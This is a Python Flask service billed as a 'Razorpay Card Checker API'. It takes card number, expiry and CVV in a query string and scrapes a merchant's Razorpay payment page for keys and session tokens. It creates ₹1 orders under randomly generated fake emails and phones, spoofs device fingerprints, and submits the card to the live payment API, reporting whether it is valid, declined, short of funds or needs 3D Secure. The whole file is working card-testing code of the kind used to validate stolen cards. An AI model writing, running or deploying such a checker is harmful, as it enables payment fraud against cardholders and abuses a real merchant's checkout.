from flask import Flask, request, jsonify
import requests
import random
import time
import re
import json
from datetime import datetime
import hashlib
import base64
import logging
import os
from tenacity import retry, stop_after_attempt, wait_exponential, retry_if_exception_type

app = Flask(__name__)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Configuration
RAZORPAY_PAGE_URL = 'https://pages.razorpay.com/paywebicent'
PAYMENT_PAGE_ID = 'pl_F4nKNAyaqwecFg'
PAYMENT_PAGE_ITEM_ID = 'ppi_F4nKNHUJswbQ5b'
AMOUNT = 100  # ₹1.00 INR

class RazorpayChecker:
    def __init__(self):
        self.session = requests.Session()
        self.key_id = None
        self.order_id = None
        self.payment_id = None
        self.session_token = None
        self.keyless_header = None
        self.device_id = None
        self.unified_session_id = None

    def generate_device_id(self):
        """Generate device ID"""
        timestamp = str(int(time.time() * 1000))
        random_part = str(random.randint(10000000, 99999999))
        hash_part = hashlib.md5(f"{timestamp}{random.random()}".encode()).hexdigest()
        return f"1.{hash_part}.{timestamp}.{random_part}"

    def generate_unified_session(self):
        """Generate unified session ID"""
        chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
        return ''.join(random.choice(chars) for _ in range(14))

    @retry(
        stop=stop_after_attempt(3),
        wait=wait_exponential(multiplier=1, min=2, max=10),
        retry=retry_if_exception_type(requests.RequestException),
        before_sleep=lambda retry_state: logger.info(f"Retrying load_payment_page... Attempt {retry_state.attempt_number}")
    )
    def load_payment_page(self):
        """Request #1: Load payment page"""
        try:
            logger.info("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            logger.info("Starting Razorpay Checker Session...")
            logger.info("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            logger.info("[Step 1/5] Loading payment page...")

            response = self.session.get(
                RAZORPAY_PAGE_URL,
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive'
                },
                timeout=15
            )

            logger.info(f"           Status: {response.status_code} ✓")

            if response.status_code == 200:
                # Primary regex for key_id
                key_match = re.search(r'"key_id"\s*:\s*"([^"]+)"', response.text)
                if key_match:
                    self.key_id = key_match.group(1)
                    logger.info(f"           ✓ key_id: {self.key_id}")
                    return True
                
                # Fallback regex in case page structure changes
                fallback_match = re.search(r'key_id\s*=\s*"([^"]+)"', response.text)
                if fallback_match:
                    self.key_id = fallback_match.group(1)
                    logger.info(f"           ✓ key_id (fallback): {self.key_id}")
                    return True
                
                logger.error(f"           Failed to extract key_id. Response snippet: {response.text[:200]}...")
                return False
            
            logger.error(f"           Failed with status {response.status_code}. Response: {response.text[:200]}...")
            return False

        except requests.RequestException as e:
            logger.error(f"           Request error: {str(e)}")
            raise
        except Exception as e:
            logger.error(f"           Unexpected error: {str(e)}")
            return False

    def create_order(self, email, phone):
        """Request #2: Create order"""
        try:
            logger.info("[Step 2/5] Creating payment order...")

            response = self.session.post(
                f'https://api.razorpay.com/v1/payment_pages/{PAYMENT_PAGE_ID}/order',
                headers={
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                },
                json={
                    'line_items': [{'payment_page_item_id': PAYMENT_PAGE_ITEM_ID, 'amount': AMOUNT}],
                    'notes': {'email': email, 'phone': phone, 'purpose': 'Advance payment'}
                },
                timeout=15
            )

            logger.info(f"           Status: {response.status_code} ✓")

            if response.status_code == 200:
                data = response.json()
                self.order_id = data.get('order', {}).get('id')
                if self.order_id:
                    logger.info(f"           ✓ order_id: {self.order_id}")
                    return True
                logger.error(f"           No order_id found in response: {json.dumps(data, indent=2)[:200]}...")
                return False
            logger.error(f"           Failed with status {response.status_code}. Response: {response.text[:200]}...")
            return False

        except Exception as e:
            logger.error(f"           Error: {str(e)}")
            return False

    def load_checkout_and_extract_token(self):
        """Request #3: Load checkout page and extract session_token"""
        try:
            logger.info("[Step 3/5] Loading checkout & extracting token...")

            # Generate IDs
            self.device_id = self.generate_device_id()
            self.unified_session_id = self.generate_unified_session()
            self.keyless_header = 'api_v1:+h7wKbpomV41CobFPpZMTAyR3UsrRhH2/snidFA3Xw7sgSD4875Vg22tFT4e7gMnN+7EwA9YE9junrz2hwGV76AEB0DSkA=='

            params = {
                'traffic_env': 'production',
                'build': '9cb57fdf457e44eac4384e182f925070ff5488d9',
                'build_v1': '715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2',
                'checkout_v2': '1',
                'new_session': '1',
                'keyless_header': self.keyless_header,
                'rzp_device_id': self.device_id,
                'unified_session_id': self.unified_session_id
            }

            response = self.session.get(
                'https://api.razorpay.com/v1/checkout/public',
                params=params,
                headers={
                    'Accept': 'text/html',
                    'Referer': 'https://pages.razorpay.com/',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                },
                timeout=15
            )

            logger.info(f"           Status: {response.status_code}")

            if response.status_code == 200:
                # Extract session_token from response
                token_match = re.search(r'window\.session_token\s*=\s*"([^"]+)"', response.text)
                if token_match:
                    self.session_token = token_match.group(1)
                    logger.info(f"           ✓ session_token: {self.session_token[:40]}...")
                    return True
                logger.error(f"           Failed to extract session_token. Response: {response.text[:200]}...")
                return False
            logger.error(f"           Failed with status {response.status_code}. Response: {response.text[:200]}...")
            return False

        except Exception as e:
            logger.error(f"           Error: {str(e)}")
            return False

    def submit_payment(self, card_number, exp_month, exp_year, cvv, email, phone):
        """Request #4: Submit payment"""
        try:
            logger.info("[Step 4/5] Submitting payment...")

            if not self.session_token:
                raise Exception("Missing session_token")

            # Checkout ID
            checkout_id = f"RRh{hashlib.md5(str(time.time()).encode()).hexdigest()[:10]}"

            # Device fingerprint
            fingerprint_payload = base64.b64encode(f"fp_{time.time()}_{random.random()}".encode()).decode()

            data = {
                'notes[email]': email,
                'notes[phone]': phone,
                'notes[purpose]': 'Advance payment',
                'payment_link_id': PAYMENT_PAGE_ID,
                'key_id': self.key_id,
                'contact': f'+91{phone}',
                'email': email,
                'currency': 'INR',
                '_[integration]': 'payment_pages',
                '_[checkout_id]': checkout_id,
                '_[device.id]': self.device_id,
                '_[library]': 'checkoutjs',
                '_[platform]': 'browser',
                '_[referer]': RAZORPAY_PAGE_URL,
                'amount': str(AMOUNT),
                'order_id': self.order_id,
                'device_fingerprint[fingerprint_payload]': fingerprint_payload,
                'method': 'card',
                'card[number]': card_number.replace(' ', ''),
                'card[cvv]': cvv,
                'card[name]': 'Test User',
                'card[expiry_month]': exp_month.zfill(2),
                'card[expiry_year]': exp_year,
                'save': '0',
                'dcc_currency': 'INR'
            }

            response = self.session.post(
                'https://api.razorpay.com/v1/standard_checkout/payments/create/ajax',
                params={
                    'key_id': self.key_id,
                    'session_token': self.session_token,
                    'keyless_header': self.keyless_header
                },
                headers={
                    'Content-type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0',
                    'x-session-token': self.session_token
                },
                data=data,
                timeout=30
            )

            logger.info(f"           Response: HTTP {response.status_code}")

            if response.status_code == 200:
                result = response.json()
                if 'razorpay_payment_id' in result:
                    self.payment_id = result['razorpay_payment_id']
                elif 'payment_id' in result:
                    self.payment_id = result['payment_id']
                logger.info(f"           payment_id: {self.payment_id}")
                return result
            else:
                return {'error': f"HTTP {response.status_code}", 'raw': response.text[:300]}

        except Exception as e:
            logger.error(f"           Error: {str(e)}")
            return {'error': str(e)}

    def check_status(self):
        """Request #5: Check payment status"""
        try:
            if not self.payment_id:
                return None

            logger.info(f"[Step 5/5] Checking status: {self.payment_id}")

            response = self.session.get(
                f'https://api.razorpay.com/v1/standard_checkout/payments/{self.payment_id}/cancel',
                params={
                    'key_id': self.key_id,
                    'session_token': self.session_token,
                    'keyless_header': self.keyless_header
                },
                headers={'x-session-token': self.session_token},
                timeout=15
            )

            logger.info(f"           Status check: HTTP {response.status_code}")
            return response.json() if response.text else None

        except Exception as e:
            logger.error(f"           Error: {str(e)}")
            return None

def format_response(payment_response, status_response=None):
    """Format response"""
    if status_response and 'error' in status_response:
        error_data = status_response.get('error', {})
        code = error_data.get('code', 'UNKNOWN_ERROR')
        description = error_data.get('description', 'Unknown error')
        reason = error_data.get('reason', 'N/A')
        step = error_data.get('step', 'N/A')
        metadata = error_data.get('metadata', {})

        if 'not_enrolled' in reason or '3dsecure' in description.lower():
            status_icon, message = '🔒 CARD NOT ENROLLED', '3D Secure not enabled'
        elif 'insufficient' in description.lower():
            status_icon, message = '💰 INSUFFICIENT FUNDS', 'Low balance'
        elif 'invalid' in description.lower():
            status_icon, message = '❌ INVALID CARD', 'Invalid details'
        elif 'expired' in description.lower():
            status_icon, message = '📅 CARD EXPIRED', 'Card expired'
        elif 'declined' in description.lower():
            status_icon, message = '❌ DECLINED', 'Issuer declined'
        else:
            status_icon, message = '❌ ERROR', description

        return {
            'status': status_icon,
            'gateway': 'Razorpay',
            'amount': '₹1.00 INR',
            'message': message,
            'error_details': {
                'code': code,
                'description': description,
                'reason': reason,
                'step': step
            },
            'transaction': {
                'payment_id': metadata.get('payment_id', 'N/A'),
                'order_id': metadata.get('order_id', 'N/A')
            }
        }

    if 'error' in payment_response:
        return {
            'status': '❌ ERROR',
            'gateway': 'Razorpay',
            'amount': '₹1.00 INR',
            'message': payment_response.get('error', 'Unknown error'),
            'raw': payment_response.get('raw', '')[:200]
        }

    if 'razorpay_payment_id' in payment_response:
        return {
            'status': '✅ SUCCESS',
            'gateway': 'Razorpay',
            'amount': '₹1.00 INR',
            'message': 'Payment processed',
            'transaction': {
                'payment_id': payment_response.get('razorpay_payment_id')
            }
        }

    if 'next' in payment_response:
        action = payment_response.get('next', [{}])[0].get('action', 'unknown')
        if action == 'otp':
            return {'status': '🔒 OTP REQUIRED', 'gateway': 'Razorpay', 'amount': '₹1.00 INR', 'message': 'OTP needed'}
        elif action == '3ds':
            return {'status': '🔒 3DS REQUIRED', 'gateway': 'Razorpay', 'amount': '₹1.00 INR', 'message': '3DS needed'}

    return {'status': '❓ UNKNOWN', 'gateway': 'Razorpay', 'amount': '₹1.00 INR', 'raw': str(payment_response)[:200]}

@app.route('/api/razorpay/pay', methods=['GET'])
def check_card():
    cc_data = request.args.get('cc')
    if not cc_data:
        return jsonify({'error': 'Missing card data', 'usage': '/api/razorpay/pay?cc=CARD|MM|YY|CVV'}), 400

    parts = cc_data.split('|')
    if len(parts) != 4:
        return jsonify({'error': 'Invalid card format'}), 400

    card_number, exp_month, exp_year, cvv = parts
    email = f"test{random.randint(1000,9999)}@example.com"
    phone = f"74287{random.randint(10000,99999)}"

    logger.info(f"\n{'='*60}")
    logger.info(f"CARD CHECK: {card_number[:6]}******{card_number[-4:]} | {exp_month}/{exp_year}")
    logger.info(f"{'='*60}")

    try:
        checker = RazorpayChecker()

        if not checker.load_payment_page():
            return jsonify({'status': '❌ ERROR', 'error': 'Failed to load payment page'}), 500

        if not checker.create_order(email, phone):
            return jsonify({'status': '❌ ERROR', 'error': 'Failed to create order'}), 500

        if not checker.load_checkout_and_extract_token():
            return jsonify({'status': '❌ ERROR', 'error': 'Failed to extract session token'}), 500

        payment_response = checker.submit_payment(card_number, exp_month, exp_year, cvv, email, phone)
        status_response = checker.check_status()
        result = format_response(payment_response, status_response)

        logger.info(f"\n{'━'*60}")
        logger.info(f"RESULT: {result['status']}")
        logger.info(f"{'━'*60}\n")

        return jsonify(result), 200

    except Exception as e:
        logger.error(f"Unexpected error in check_card: {str(e)}")
        return jsonify({'status': '❌ ERROR', 'error': f"Internal server error: {str(e)}"}), 500

@app.route('/health', methods=['GET'])
def health():
    return jsonify({'status': 'healthy', 'service': 'Razorpay Checker', 'version': '1.1.0'}), 200

@app.route('/', methods=['GET'])
def root():
    return jsonify({
        'service': 'Razorpay Card Checker API',
        'version': '1.1.0',
        'gateway': 'Razorpay (India)',
        'amount': '₹1.00 INR',
        'endpoints': {
            '/api/razorpay/pay?cc=CARD|MM|YY|CVV': 'Card check',
            '/health': 'Health check'
        }
    }), 200

if __name__ == '__main__':
    print("\n" + "="*70)
    print("║" + " "*18 + "Razorpay Checker API v1.1.0" + " "*25 + "║")
    print("="*70)
    print("Gateway: Razorpay (India) | Amount: ₹1.00 INR")
    print("\nComplete Flow:")
    print("  1. Load payment page → Extract key_id")
    print("  2. Create order → Get order_id")
    print("  3. Load checkout page → Extract session_token from HTML")
    print("  4. Submit payment → Process card with real token")
    print("  5. Check status → Get final result")
    print("\nServer starting on 0.0.0.0:5000...")
    print("="*70 + "\n")
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
